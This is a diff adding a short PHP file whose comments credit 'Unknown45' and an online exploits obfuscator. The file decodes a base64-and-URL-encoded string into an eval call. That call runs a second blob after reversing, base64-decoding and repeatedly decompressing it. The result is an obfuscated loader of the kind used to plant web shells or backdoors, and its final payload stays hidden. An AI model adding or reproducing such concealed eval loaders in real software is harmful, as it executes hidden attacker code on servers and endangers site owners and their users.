@@ -1,0 +1,12 @@
+<?php
+
+//Encode by : Unknown45
+//Obfuscated by : Unknown45
+//Level : Strong
+//Tool Online : https://exploits.my.id
+
+$unknown = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
+$uk45 = "2Gc4QFS9Qb3B7XTcu4GjxV8dwd+YfJyEjkdIWKS6YwQ6DSA2che9c+WltuixSXQT7wTNs1KrtgOPF+FO5SzZFV4N9+GeEaJ2aiYiwHtD7GJS20+OuQrARuPBd8QhvgAuwkiDfhvYQLPPrex6PrEEyNGE+8a9ucjTyueaUt4+ugR8TqiqduRSpuiSZt7DjGaqJpVpZVUep/SIZ+5x6WrlxBi2Xj51JULlXLmxAIsu3V/me7LfqivlEXw0KRfpR3Pn0uCK1iIH2N2LYzrijDjO5fMT62v8mIDwGGYrDbEEovC/F+0IgyjyC5Jz65nc8Z3ji0rSssxIElrasUrdM9w1389iW8LFeqHHlDxj4RoQjcqwewBBy/Wj+fDsP0cV4OzRytdnjMhy7ZyiD0f3FvtiLBh2cwKkkTF4/QAaJP5swjBu8LEmHpK8yWfqJNgWll3d2/c7futIIiH0YuHSxJZ//TLIdIZU6Y9GuVbFQ1A4QK9dAhXnmYTV4jZ7abD5hSFTX5PDwM+TfLVlcin/4FwhBwJe+3WASGg/oFwlB4/YBwZA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
+exit;
+?>
